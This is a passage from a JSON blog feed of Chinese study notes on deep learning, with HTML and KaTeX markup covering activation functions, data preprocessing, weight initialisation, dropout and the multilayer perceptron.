encoding=\"application/x-tex\">W_2为[4,4]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">为</span><span class=\"mopen\">[</span><span class=\"mord\">4</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">4</span><span class=\"mclose\">]</span></span></span></span>，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mn>3</mn></msub><mtext>为</mtext><mo stretchy=\"false\">[</mo><mn>4</mn><mo separator=\"true\">,</mo><mn>1</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">W_3为[4,1]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">为</span><span class=\"mopen\">[</span><span class=\"mord\">4</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">]</span></span></span></span>）</p>\n</li>\n<li>\n<p><strong>非线性</strong>：与进入下一层之前，要先将数据带入一个非线性函数（<strong>激活函数</strong>）。<br />\n（并不是直接进行矩阵乘法得到下一层）</p>\n</li>\n</ul>\n</blockquote>\n<p><strong>神经元个数</strong>越多，得到的拟合程度越大，在训练集上得到的效果越好，但运行速度也越慢，过拟合风险也越大</p>\n<h3 id=\"激活函数\"><a class=\"anchor\" href=\"#激活函数\">#</a> 激活函数</h3>\n<p>在进入下一层之前，需要将结果带入 <strong>激活函数</strong>（activation function）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1707014357/Typera/2024/02/f79db5c9930cfb1b4f2727fa1c0521cd.png\" alt=\"image-20240204103909908\" /></p>\n<p><strong>常用的激活函数</strong>：</p>\n<ul>\n<li>Sigmoid<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1707014604/Typera/2024/02/bfbaab26a7337f5d17a89bf7c0b83fbb.png\" alt=\"image-20240204104322221\" /><br />\n 存在问题：（因此不怎么使用)\n<ul>\n<li><mark>梯度消失</mark>：因为某一步操作导致梯度为 0<br />\n（因为梯度下降算法是乘法操作，如果某一步梯度为 0，则后续都不会进行更新）。<br />\nSigmoid 函数最左和最右侧的点，梯度约等于 0。</li>\n</ul>\n</li>\n<li>Relu<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1707015158/Typera/2024/02/5002844ea34e2cbbbc0f4ad8bc45022b.png\" alt=\"image-20240204105235840\" /><br />\n 最常用的激活函数</li>\n<li>Tanh</li>\n<li>...</li>\n</ul>\n<h1 id=\"数据预处理\"><a class=\"anchor\" href=\"#数据预处理\">#</a> 数据预处理</h1>\n<ol>\n<li>中心化（获得 zero-centered data） =&gt; 每个数据减去均值</li>\n<li>维度放缩（获得 normalized data） =&gt; 每个数据除以标准差</li>\n</ol>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1707032058/Typera/2024/02/c5c34358b91b9e224decdd4749b2caa4.png\" alt=\"image-20240204153409550\" /></p>\n<h1 id=\"参数初始化\"><a class=\"anchor\" href=\"#参数初始化\">#</a> 参数初始化</h1>\n<p>（初始化 权重参数矩阵）</p>\n<blockquote>\n<p>通常使用 <strong>随机策略</strong> 进行参数初始化：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi><mo>=</mo><mn>0.01</mn><mo>×</mo><mi>n</mi><mi>p</mi><mi mathvariant=\"normal\">.</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>m</mi><mi mathvariant=\"normal\">.</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>D</mi><mo separator=\"true\">,</mo><mi>H</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">W=0.01 \\times np.random.randn(D,H)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">0.01</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">p</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">an</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">m</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">an</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mclose\">)</span></span></span></span></p>\n</blockquote>\n<p>乘以 0.01 的原因：<br />\n我们希望 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span> 中的数据 <strong>浮动较小</strong>（浮动较大的模型更容易导致过拟合）</p>\n<h1 id=\"过拟合解决方法\"><a class=\"anchor\" href=\"#过拟合解决方法\">#</a> 过拟合解决方法</h1>\n<ol>\n<li><strong>正则化惩罚项</strong>（损失函数中加入 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>λ</mi><mi>R</mi><mo stretchy=\"false\">(</mo><mi>W</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\lambda R(W)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">λ</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mclose\">)</span></span></span></span> 项）</li>\n<li><strong>DROP-OUT</strong>（七伤拳）</li>\n<li>...</li>\n</ol>\n<p><strong>DROP-OUT</strong>：<br />\n在 <strong>每一次</strong> 的神经网络的训练过程中，对每一层都随机地杀死一些神经元<br />\n（每次 不使用 的神经元都是随机的）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1707033110/Typera/2024/02/474db62dc55e25ec6bd327e4534d79aa.png\" alt=\"image-20240204155147233\" /></p>\n",
            "tags": [
                "深度学习",
                "毕业设计",
                "机器学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/Graduation/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E5%99%A8/",
            "url": "https://www.sycamore.top/Graduation/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E5%99%A8/",
            "title": "多层感知器",
            "date_published": "2024-01-31T16:37:41.000Z",
            "content_html": "<h1 id=\"多层感知器\"><a class=\"anchor\" href=\"#多层感知器\">#</a> 多层感知器</h1>\n<p>（MLP, Multi Layer Perceptron）</p>\n<blockquote>\n<p>模仿人的思考机制 =&gt; （网状结构）</p>\n<ul>\n<li><strong>树突</strong>接受 多个 神经元的轴突释放的<strong>递质</strong>，产生信息并将信息转递给轴突，并由<strong>轴突</strong>再次向后续神经元释放递质，实现信息传递。</li>\n<li>从 多个 上一层的模型中获得输入数据，通过某个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">f(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 得到输出数据，并作为下一层模型的数据输入。</li>\n</ul>\n</blockquote>\n<p>MLP 数学表达式（简化）：</p>\n<p>$ a_<ruby>1}<rp>(</rp><rt>{2</rt><rp>)</rp></ruby> =g(\\theta_<ruby>10}<rp>(</rp><rt>{1</rt><rp>)</rp></ruby>x_<ruby>0}+\\theta_{11}<rp>(</rp><rt>{1</rt><rp>)</rp></ruby>x_<ruby>1}+\\theta_{12}<rp>(</rp><rt>{1</rt><rp>)</rp></ruby>x_<ruby>2}+\\theta_{13}<rp>(</rp><rt>{1</rt><rp>)</rp></ruby>x_{3})$</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>a</mi><mn>2</mn><mn>2</mn></msubsup><mo>=</mo><mi>g</mi><mo stretchy=\"false\">(</mo><msubsup><mi>θ</mi><mn>20</mn><mn>1</mn></msubsup><msub><mi>x</mi><mn>0</mn></msub><mo>+</mo><msubsup><mi>θ</mi><mn>21</mn><mn>1</mn></msubsup><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msubsup><mi>θ</mi><mn>22</mn><mn>1</mn></msubsup><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><msubsup><mi>θ</mi><mn>23</mn><mn>1</mn></msubsup><msub><mi>x</mi><mn>3</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">a_{2}^{2} =g(\\theta_{20}^{1}x_{0}+\\theta_{21}^{1}x_{1}+\\theta_{22}^{1}x_{2}+\\theta_{23}^{1}x_{3})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0622em;vertical-align:-0.2481em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0641em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">20</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0622em;vertical-align:-0.2481em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">21</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0622em;vertical-align:-0.2481em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">22</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0641em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">23</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">3</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>a</mi><mn>3</mn><mn>2</mn></msubsup><mo>=</mo><mi>g</mi><mo stretchy=\"false\">(</mo><msubsup><mi>θ</mi><mn>30</mn><mn>1</mn></msubsup><msub><mi>x</mi><mn>0</mn></msub><mo>+</mo><msubsup><mi>θ</mi><mn>31</mn><mn>1</mn></msubsup><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msubsup><mi>θ</mi><mn>32</mn><mn>1</mn></msubsup><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><msubsup><mi>θ</mi><mn>33</mn><mn>1</mn></msubsup><msub><mi>x</mi><mn>3</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">a_{3}^{2} =g(\\theta_{30}^{1}x_{0}+\\theta_{31}^{1}x_{1}+\\theta_{32}^{1}x_{2}+\\theta_{33}^{1}x_{3})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0622em;vertical-align:-0.2481em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">3</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0641em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">30</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0622em;vertical-align:-0.2481em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">31</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0622em;vertical-align:-0.2481em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">32</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.0641em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">33</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2481em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">3</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi><mo>=</mo><mi>g</mi><mo stretchy=\"false\">(</mo><msubsup><mi>θ</mi><mn>10</mn><mn>2</mn></msubsup><msubsup><mi>a</mi><mn>0</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>θ</mi><mn>11</mn><mn>2</mn></msubsup><msubsup><mi>a</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>θ</mi><mn>12</mn><mn>2</mn></msubsup><msubsup><mi>a</mi><mn>2</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>θ</mi><mn>3</mn><mn>2</mn></msubsup><msubsup><mi>a</mi><mn>3</mn><mn>2</mn></msubsup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">y=g(\\theta_{10}^2a_0^2+\\theta_{11}^2a_1^2+\\theta_{12}^2a_2^2+\\theta_3^2a_3^2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" 